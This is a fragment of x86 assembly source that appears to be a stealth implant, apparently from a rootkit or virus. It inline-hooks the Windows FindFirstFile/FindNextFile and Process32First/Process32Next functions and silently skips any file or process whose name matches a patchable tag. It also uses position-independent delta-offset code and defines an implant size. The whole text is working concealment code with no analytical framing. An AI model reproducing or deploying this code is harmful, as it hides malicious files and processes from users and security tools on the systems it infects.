fff_entry:
       push dword [esp+8]
       push dword [esp+8]
       call swap_fff
       call _fff
       call swap_fff
       cmp eax, -1
       je .error
       call check_name2
       jnz .error
       push dword [esp+8]
       push dword [esp+8]
       call fnf_entry
  .error:
       ret 2*4

fnf_entry:
  .retry:
       push dword [esp+8]
       push dword [esp+8]
       call swap_fnf
       call _fnf
       call swap_fnf
       test eax, eax
       jz .error
       call check_name2
       jz .retry
  .error:
       ret 2*4

p32f_entry:
       push dword [esp+8]
       push dword [esp+8]
       call swap_p32f
       call _p32f
       call swap_p32f
       test eax, eax
       jz .error
       call check_name
       jnz .error
       push dword [esp+8]
       push dword [esp+8]
       call p32n_entry
  .error:
       ret 2*4

p32n_entry:
  .retry:
       push dword [esp+8]
       push dword [esp+8]
       call swap_p32n
       call _p32n
       call swap_p32n
       test eax, eax
       jz .error
       call check_name
       jz .retry
  .error:
       ret 2*4

_fff:
       db 0b8h
  fff  dd 0
       jmp eax

_fnf:
       db 0b8h
  fnf  dd 0
       jmp eax

_p32f:
       db 0b8h
  p32f dd 0
       jmp eax

_p32n:
       db 0b8h
  p32n dd 0
       jmp eax

check_name2:
       pushad
       mov esi, [esp+(8*4)+8+4]
       add esi, byte 44
       jmp_ check_name.slash

check_name:
       pushad
       mov esi, [esp+(8*4)+8+4]
       add esi, byte 36
  .slash:
       mov ebx, esi
  .nxt_char:
       lodsb
       cmp al, "\"
       je .slash
  .no_slash:
       test al, al
       jnz .nxt_char
  .cmp_name:
       cmp dword [ebx], "0000"
  .name1 equ $-4
       jne .isnot
       cmp dword [ebx+4], "0000"
  .name2 equ $-4
  .isnot:
       popad
       ret

delta:
       call .tmpdelta
  .tmpdelta:
       pop ebp
       sub ebp, .tmpdelta
       ret

swap_fff:
       pushad
       call delta
       lea esi, [ebp+fff_code]
       mov edi, [ebp+fff]
       jmp_ swap_p32n.swap

swap_fnf:
       pushad
       call delta
       lea esi, [ebp+fnf_code]
       mov edi, [ebp+fnf]
       jmp_ swap_p32n.swap

swap_p32f:
       pushad
       call delta
       lea esi, [ebp+p32f_code]
       mov edi, [ebp+p32f]
       jmp_ swap_p32n.swap

swap_p32n:
       pushad
       call delta
       lea esi, [ebp+p32n_code]
       mov edi, [ebp+p32n]
  .swap:
       push dword [edi]
       push dword [edi+4]
       push dword [esi]
       push dword [esi+4]
       pop dword [edi+4]
       pop dword [edi]
       pop dword [esi+4]
       pop dword [esi]
       popad
       ret

p32n_code:
p32f_code equ p32n_code+8
fff_code  equ p32n_code+16
fnf_code  equ p32n_code+24

implant_size equ p32n_code-fff_entry

